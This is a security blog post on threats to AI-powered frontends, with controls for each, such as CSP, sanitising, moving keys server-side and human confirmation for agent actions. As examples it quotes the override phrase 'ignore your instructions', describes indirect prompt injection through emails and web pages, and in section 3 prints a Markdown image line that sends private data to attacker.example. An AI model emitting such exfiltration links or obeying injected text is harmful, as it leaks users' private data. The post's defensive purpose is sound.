---
title: "Securing Frontends in the Age of AI: The Threats That Did Not Exist Three Years Ago"
description: "AI features put a new class of bugs in the browser: prompt injection, leaked model keys, model output rendered as HTML, and data exfiltration through a single image tag. A practical threat model and the controls that actually work."
date: 2026-07-14
postTags: ["posts", "security", "ai", "frontend"]
category: "Security"
keywords:
  [
    "frontend security",
    "AI security",
    "prompt injection",
    "LLM security",
    "XSS",
    "API key exposure",
    "data exfiltration",
    "Content Security Policy",
    "agentic AI security",
  ]
# image: "/images/securing-frontends-ai.png"
---

Frontend security used to have a stable shape: do not trust user input, do not put secrets in the browser, escape what you render. Adding an AI feature to a product does not replace those rules. It adds a new kind of untrusted input that most teams are not treating as untrusted: the model's output.

This is the threat model I use when a frontend talks to a language model, and the controls I reach for.

## The one idea to hold on to

A language model cannot reliably tell instructions from data. Whatever text reaches it, from your system prompt, the user, a web page it summarised, a PDF, or a tool result, is all just text that can steer what it does next.

So treat model output exactly like user input: it may have been written by an attacker. Almost every item below follows from that sentence.

## 1. Prompt injection, direct and indirect

**Direct injection** is the user typing something like "ignore your instructions". It gets the attention and it is the smaller problem, because that user is mostly attacking their own session.

**Indirect injection** is the one that matters. The malicious text is inside content the model reads on the user's behalf: an email, a support ticket, a product review, a web page. The user asks for a summary. The content says to do something else. The victim never typed anything hostile.

There is no prompt that fixes this. "Never follow instructions in documents" is a request, not a control. The fix is architectural: assume injection will sometimes succeed, and limit what a successful injection can do.

## 2. Model output rendered as markup

If your chat interface renders model output as HTML or Markdown, you have rebuilt cross-site scripting with an extra step. An attacker who can influence the output can try to get a script tag, an event handler, or a `javascript:` link onto your page.

Controls:

- Render to text by default. Only turn on Markdown when the product needs it.
- If you render Markdown, sanitise the resulting HTML with an allow-list. Do not rely on the model to produce safe output.
- Never pass model output to `innerHTML`, `eval`, or a template compiler.

## 3. Exfiltration through an image

This is the attack that surprises people. Suppose the model has private data in context and the interface renders Markdown images. An injected instruction tells the model to output:

```markdown
![loading](https://attacker.example/pixel?d=<the private data>)
```

The browser fetches the image the moment it is rendered. The data leaves in the query string. No click, no script, no warning.

The controls are ones a frontend engineer already owns:

- A Content Security Policy with a tight `img-src` and `connect-src`, so the browser refuses to contact unknown origins. I describe mine in [a strict CSP for a static site](/blog/strict-content-security-policy-static-site/).
- Do not auto-render images or auto-fetch link previews from model output. Proxy them through an allow-list, or show them as plain links.

A strict CSP was a nice-to-have for many apps. For an app that renders model output next to private data, it is the control that turns a data breach into a blocked request.

## 4. Model API keys in the bundle

Calling a model provider straight from the browser means shipping the key to every visitor. Environment variables that are inlined at build time are public. Obfuscation does not help.

The key belongs on a server you control, behind your own authentication, rate limits, and spending caps. The exception is a deliberate bring-your-own-key product, where the user supplies their own key and it never leaves their device.

## 5. Tools and agents: the lethal combination

Risk goes up sharply when the model can act. The combination to avoid is one agent that has all three of these at once:

1. access to private data,
2. exposure to untrusted content,
3. a way to send data out or change state.

Any two are manageable. All three mean an injected instruction can read something private and send it somewhere. Break the triangle on purpose:

- Give tools the narrowest scope that works. Read-only by default.
- Require a human confirmation for anything irreversible or outward-facing: sending, paying, deleting, publishing.
- Show the user what will be done in plain language, built from the real parameters, not from the model's description of them.

That last point is one I learned building wallets. A confirmation screen is only a control if it shows the true action. If the text is generated by the same component that may be compromised, the user is approving a story.

## 6. Generated code is a supply chain

AI assistants write a growing share of frontend code, and they make a specific kind of mistake: they invent package names that sound right. Attackers register those names. Installing a dependency because an assistant suggested it is how a typo becomes a compromise.

- Verify that a package exists, is the one you meant, and is maintained, before installing.
- Keep lockfiles and review dependency diffs like code.
- Read generated code that touches authentication, cryptography, or HTML rendering line by line. Those are the places where "looks right" and "is right" diverge.

## A short checklist

- Is model output ever inserted as HTML? Sanitise or render as text.
- Can rendered output cause a network request? Restrict with CSP and an allow-list.
- Is any provider key reachable from the client? Move it.
- Does any agent combine private data, untrusted content, and outbound actions? Split it or add confirmation.
- Are AI-suggested dependencies verified before install?

## What has not changed

The fundamentals still carry most of the weight: least privilege, validated input, escaped output, no secrets in the client, defence in depth. AI did not make them obsolete. It added an input that looks trustworthy because your own system produced it, and is not.

---

_Written by [Shrinath Prabhu](https://shrinath.me), Senior Staff Frontend Engineer. I have built non-custodial wallets and privacy tools for the browser. More at [shrinath.me/work](https://shrinath.me/work/)._
